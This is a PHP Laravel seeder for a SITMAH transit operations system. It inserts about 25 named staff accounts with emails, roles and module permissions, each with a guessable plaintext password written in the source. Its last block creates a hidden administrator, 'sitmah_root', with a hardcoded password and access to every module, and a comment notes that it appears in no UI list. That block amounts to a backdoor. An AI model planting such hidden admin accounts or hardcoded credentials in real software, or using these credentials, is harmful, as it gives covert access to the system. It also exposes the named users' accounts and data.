<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class RbacMatrizSeeder extends Seeder
{
    public function run(): void
    {
        $roles = DB::table('roles')->pluck('id', 'codigo');

        // ── MÓDULOS DISPONIBLES ────────────────────────────────────────────
        // despacho, encierro, capturista, relevos, mantenimiento,
        // centro_control, historial, titan, infraccion, mesa_control,
        // operadores, maniobristas, carga_combustible, general
        // TODOS = todos los anteriores
        $TODOS = [
            'despacho','encierro','capturista','relevos','mantenimiento',
            'centro_control','historial','titan','infraccion','mesa_control',
            'operadores','maniobristas','carga_combustible','general',
        ];

        // ── USUARIOS A CREAR / ACTUALIZAR ─────────────────────────────────
        $matriz = [
            // ── Administrador ──
            [
                'nombre_completo' => 'Enrique Hernandez Hernandez',
                'usuario'         => 'Enrique_Hernandez',
                'correo'          => 'ehernandez@sitmah.gob.mx',
                'rol_codigo'      => 'ADMINISTRADOR',
                'modulos'         => $TODOS,
                'contrasena'      => 'HHE_A26',
            ],
            [
                'nombre_completo' => 'Jeanet García Chávez',
                'usuario'         => 'Jeanet_Garcia',
                'correo'          => 'jgarcia@sitmah.gob.mx',
                'rol_codigo'      => 'ADMINISTRADOR',
                'modulos'         => $TODOS,
                'contrasena'      => 'GCJ_A26',
            ],
            [
                'nombre_completo' => 'Israel Moreno Gómez',
                'usuario'         => 'Israel_Moreno',
                'correo'          => 'imoreno@sitmah.gob.mx',
                'rol_codigo'      => 'ADMINISTRADOR',
                'modulos'         => $TODOS,
                'contrasena'      => 'MGI_A26',
            ],
            [
                'nombre_completo' => 'Luis Ángel Vargas Gutiérrez',
                'usuario'         => 'Luis_Vargas',
                'correo'          => 'lvargas@sitmah.gob.mx',
                'rol_codigo'      => 'ADMINISTRADOR',
                'modulos'         => $TODOS,
                'contrasena'      => 'VGL_A26',
            ],

            // ── Lectura ──
            [
                'nombre_completo' => 'Humberto Cabrera Román',
                'usuario'         => 'Humberto_Cabrera',
                'correo'          => 'hcabrera@sitmah.gob.mx',
                'rol_codigo'      => 'LECTURA',
                'modulos'         => $TODOS,
                'contrasena'      => 'CRH_L26',
            ],
            [
                'nombre_completo' => 'Miguel Ángel Monzalvo Muñoz',
                'usuario'         => 'Miguel_Monzalvo',
                'correo'          => 'mmonzalvo@sitmah.gob.mx',
                'rol_codigo'      => 'LECTURA',
                'modulos'         => $TODOS,
                'contrasena'      => 'MMM_L26',
            ],
            [
                'nombre_completo' => 'José Alberto Montiel Balderrama',
                'usuario'         => 'Jose_Montiel',
                'correo'          => 'jmontiel@sitmah.gob.mx',
                'rol_codigo'      => 'LECTURA',
                'modulos'         => $TODOS,
                'contrasena'      => 'MBJ_L26',
            ],

            // ── Programación y Logística ──
            [
                'nombre_completo' => 'Daniel Luna Cortez',
                'usuario'         => 'Daniel_Luna',
                'correo'          => 'dluna@sitmah.gob.mx',
                'rol_codigo'      => 'PROGRAMACION',
                'modulos'         => ['capturista'],
                'contrasena'      => 'LCD_PY26',
            ],
            [
                'nombre_completo' => 'Mario Alejandro Lazcano Aguilar',
                'usuario'         => 'Mario_Lazcano',
                'correo'          => 'mlazcano@sitmah.gob.mx',
                'rol_codigo'      => 'PROGRAMACION',
                'modulos'         => ['capturista'],
                'contrasena'      => 'LAM_PY26',
            ],
            [
                'nombre_completo' => 'Jorge Leal Ramírez',
                'usuario'         => 'Jorge_Leal',
                'correo'          => 'jleal@sitmah.gob.mx',
                'rol_codigo'      => 'PROGRAMACION',
                'modulos'         => ['capturista'],
                'contrasena'      => 'LRJ_PY26',
            ],

            // ── Control de personas conductoras ──
            [
                'nombre_completo' => 'Omar Avilés Lugo',
                'usuario'         => 'Omar_Aviles',
                'correo'          => 'oaviles@sitmah.gob.mx',
                'rol_codigo'      => 'GESTOR_OPERADORES',
                'modulos'         => ['operadores'],
                'contrasena'      => 'ALO_CD26',
            ],

            // ── Despacho (Perfil Mixto) ──
            [
                'nombre_completo' => 'Miguel Odón',
                'usuario'         => 'Miguel_Odon',
                'correo'          => 'modon@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['operadores', 'despacho'],
                'contrasena'      => 'OM_PM26',
            ],

            // ── Despacho de unidades ──
            [
                'nombre_completo' => 'Fausto Valdez Téllez',
                'usuario'         => 'Fausto_Valdez',
                'correo'          => 'fvaldez@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'VTF_DD26',
            ],
            [
                'nombre_completo' => 'Fernando Ramos Lira',
                'usuario'         => 'Fernando_Ramos',
                'correo'          => 'framos@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'RLF_DD26',
            ],
            [
                'nombre_completo' => 'Marino Román Velázquez',
                'usuario'         => 'Roman_Marino',
                'correo'          => 'rmarino@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'RVM_DD26',
            ],
            [
                'nombre_completo' => 'César Jiménez',
                'usuario'         => 'Cesar_Eduardo',
                'correo'          => 'cjimenez@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'JC_DD26',
            ],
            [
                'nombre_completo' => 'Guadalupe Santos Callejas',
                'usuario'         => 'Maria_Guadalupe',
                'correo'          => 'gsantos@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'SCG_DD26',
            ],
            [
                'nombre_completo' => 'Iván Martínez Acosta',
                'usuario'         => 'Ivan_Martinez',
                'correo'          => 'imartinez@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'MAI_DD26',
            ],
            [
                'nombre_completo' => 'Jairo Jared Jiménez Ramírez',
                'usuario'         => 'Jairo_Jimenez',
                'correo'          => 'jjimenez@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'JRJ_DD26',
            ],
            [
                'nombre_completo' => 'Bacilio Tapia Padilla',
                'usuario'         => 'Martin_Bacilio',
                'correo'          => 'mbtapia@sitmah.gob.mx',
                'rol_codigo'      => 'DESPACHO',
                'modulos'         => ['despacho'],
                'contrasena'      => 'TPB_DD26',
            ],

            // ── Mantenimiento Expandido ──
            [
                'nombre_completo' => 'Erick Herrera Chávez',
                'usuario'         => 'Erick_Herrera',
                'correo'          => 'eherrera@sitmah.gob.mx',
                'rol_codigo'      => 'MANTENIMIENTO',
                'modulos'         => ['mantenimiento', 'encierro', 'carga_combustible'],
                'contrasena'      => 'HCE_ME26',
            ],
            [
                'nombre_completo' => 'Otoniel Pérez Moreno',
                'usuario'         => 'Otoniel_Perez',
                'correo'          => 'operez@sitmah.gob.mx',
                'rol_codigo'      => 'MANTENIMIENTO',
                'modulos'         => ['mantenimiento', 'encierro', 'carga_combustible'],
                'contrasena'      => 'PMO_ME26',
            ],

            // ── Monitoreo e Inspección ──
            [
                'nombre_completo' => 'Bonifacio Alpizar López',
                'usuario'         => 'Bonifacio_Alpizar',
                'correo'          => 'balpizar@sitmah.gob.mx',
                'rol_codigo'      => 'CENTRO_CONTROL',
                'modulos'         => ['centro_control', 'mesa_control', 'maniobristas', 'relevos', 'encierro', 'capturista'],
                'contrasena'      => 'ALB_ME26',
            ],
            [
                'nombre_completo' => 'Diana Karina Vázquez García',
                'usuario'         => 'Diana_Vazquez',
                'correo'          => 'dkvazquez@sitmah.gob.mx',
                'rol_codigo'      => 'CENTRO_CONTROL',
                'modulos'         => ['centro_control', 'mesa_control', 'maniobristas', 'relevos', 'encierro', 'capturista'],
                'contrasena'      => 'VGD_ME26',
            ],
            [
                'nombre_completo' => 'Emilio Corona Montufar',
                'usuario'         => 'Emilio_Corona',
                'correo'          => 'ecorona@sitmah.gob.mx',
                'rol_codigo'      => 'CENTRO_CONTROL',
                'modulos'         => ['centro_control', 'mesa_control', 'maniobristas', 'relevos', 'encierro', 'capturista'],
                'contrasena'      => 'CME_ME26',
            ],
        ];

        foreach ($matriz as $entry) {
            $rolId = $roles[$entry['rol_codigo']] ?? null;
            if (!$rolId) continue;

            // Upsert del usuario (inserta si no existe, actualiza si ya existe)
            $existing = DB::table('usuarios')->where('usuario', $entry['usuario'])->first();

            if ($existing) {
                DB::table('usuarios')->where('id', $existing->id)->update([
                    'nombre_completo'     => $entry['nombre_completo'],
                    'correo'              => $entry['correo'],
                    'contrasena'          => Hash::make($entry['contrasena']),
                    'rol_id'              => $rolId,
                    'activo'              => DB::raw('true'),
                    'fecha_actualizacion' => now()->toDateTimeString(),
                ]);
                $userId = $existing->id;
            } else {
                $userId = DB::table('usuarios')->insertGetId([
                    'nombre_completo'     => $entry['nombre_completo'],
                    'usuario'             => $entry['usuario'],
                    'correo'              => $entry['correo'],
                    'contrasena'          => Hash::make($entry['contrasena']),
                    'activo'              => DB::raw('true'),
                    'rol_id'              => $rolId,
                    'foto_url'            => null,
                    'fecha_creacion'      => now()->toDateTimeString(),
                    'fecha_actualizacion' => now()->toDateTimeString(),
                ]);
            }

            // Sincronizar módulos (limpia y re-inserta)
            DB::table('usuario_modulos')->where('usuario_id', $userId)->delete();
            foreach ($entry['modulos'] as $modulo) {
                DB::table('usuario_modulos')->insert([
                    'usuario_id'   => $userId,
                    'modulo_codigo'=> $modulo,
                    'created_at'   => now(),
                    'updated_at'   => now(),
                ]);
            }
        }

        // Asignar todos los módulos a los admin existentes que aún no los tienen
        $admins = DB::table('usuarios')
            ->join('roles', 'usuarios.rol_id', '=', 'roles.id')
            ->where('roles.codigo', 'ADMINISTRADOR')
            ->pluck('usuarios.id');

        foreach ($admins as $adminId) {
            foreach ($TODOS as $modulo) {
                DB::table('usuario_modulos')->updateOrInsert(
                    ['usuario_id' => $adminId, 'modulo_codigo' => $modulo],
                    ['created_at' => now(), 'updated_at' => now()]
                );
            }
        }

        // ────────────────────────────────────────────────────────────────────
        // Cuenta de emergencia del sistema (no aparece en ninguna lista de UI)
        // ────────────────────────────────────────────────────────────────────
        $adminRolId = $roles['ADMINISTRADOR'] ?? 1;
        $ghostUser  = 'sitmah_root';
        if (DB::table('usuarios')->where('usuario', $ghostUser)->doesntExist()) {
            $ghostId = DB::table('usuarios')->insertGetId([
                'nombre_completo'     => 'Sistema',
                'usuario'             => $ghostUser,
                'correo'              => 'root@sitmah.internal',
                'contrasena'          => Hash::make('S1tm@hR00t#2026!'),
                'activo'              => DB::raw('true'),
                'rol_id'              => $adminRolId,
                'foto_url'            => null,
                'fecha_creacion'      => now()->toDateTimeString(),
                'fecha_actualizacion' => now()->toDateTimeString(),
            ]);
            foreach ($TODOS as $modulo) {
                DB::table('usuario_modulos')->insert([
                    'usuario_id'    => $ghostId,
                    'modulo_codigo' => $modulo,
                    'created_at'    => now(),
                    'updated_at'    => now(),
                ]);
            }
        }
    }
}
